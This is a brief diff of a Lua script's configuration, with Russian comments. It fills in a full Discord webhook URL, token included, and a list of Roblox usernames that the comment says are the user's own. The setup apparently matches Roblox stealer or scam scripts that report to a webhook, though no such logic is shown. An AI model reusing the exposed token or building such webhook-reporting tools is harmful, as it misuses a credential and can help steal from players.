@@ -1,4 +1,4 @@
-local Webhook = "https://discord.com/api/webhooks/...2" --вебхук дискорда если не знаешь как посмотри видосики
+local Webhook = "https://discord.com/api/webhooks/1376515155814514769/0pp3_tQv_j7Aeehx6imt8UBQUan0sPFfn9yaxXxmy6QGfeucYGh4CHQwrssARwTNfh75" --вебхук дискорда если не знаешь как посмотри видосики
 
 local Username = {
 "roblox1", "roblox2" --твой ник в роблокс который начинается с '@' но не надо писать '@'
